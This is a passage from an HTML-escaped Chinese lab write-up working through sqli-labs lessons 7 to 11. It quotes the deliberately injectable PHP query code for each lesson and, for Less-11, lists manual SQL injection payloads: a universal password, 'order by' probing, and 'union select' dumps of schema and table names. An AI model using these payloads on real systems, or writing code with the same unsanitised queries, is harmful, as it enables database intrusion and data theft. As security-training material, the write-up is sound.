class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in.... Use outfile......&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You have an error in your SQL syntax&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//print_r(mysql_error());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现 mysql_error () 被注释掉，所以报错、联合查询不了&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;20-sqli-labs-masterless-8&#34;&gt; 20. sqli-labs-master/Less-8&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间（’,%’）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
 sqlmap 跑一下，发现是布尔或时间盲注&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;#x27; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;You are in...........&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//print_r(mysql_error());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;You have an error in your SQL syntax&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size= 3&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;21-sqli-labs-masterless-9&#34;&gt; 21. sqli-labs-master/Less-9&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间（’,%’）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判断&lt;br&gt;
布尔、时间盲注&lt;/li&gt;
&lt;li&gt;代码&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;#x27; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//print_r(mysql_error());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;You have an error in your SQL syntax&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size= 3&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;span id=&#34;22-sqli-labs-masterless-10sqlmap-没跑出来&#34;&gt; 22. sqli-labs-master/Less-10（sqlmap 没跑出来！！！)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间（&amp;quot;,’&amp;quot;）&lt;br&gt;
手工实现时间盲注&lt;br&gt;
盲注为双引号盲注&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//print_r(mysql_error());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;You have an error in your SQL syntax&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size= 3&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;23-sqli-labs-masterless-11&#34;&gt; 23. sqli-labs-master/Less-11&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型联合、报错、布尔、时间&lt;br&gt;
’&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先它是 post 型，其次发现万能密码可行，至此发现一条普遍规律&lt;br&gt;
在 url 中建议用–+ 注释，在 POST 注入中用 #注释&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看源代码，发现字符型联合注入，报错注入都可&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 salmap 没跑出来&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
使用 1，1’字符型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断字段数&lt;br&gt;
 1’ order by 2 #&lt;br&gt;
1’ order by 3 #&lt;br&gt;
字段数为 2&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;显位&lt;br&gt;
 1’ union select 1,2 #&lt;br&gt;
1,2 位置成功显示出来&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆库&lt;br&gt;
 1’ union select 1,group_concat (schema_name) from (information_schema.schemata) #&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表&lt;br&gt;
 1’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database () #&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆列&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
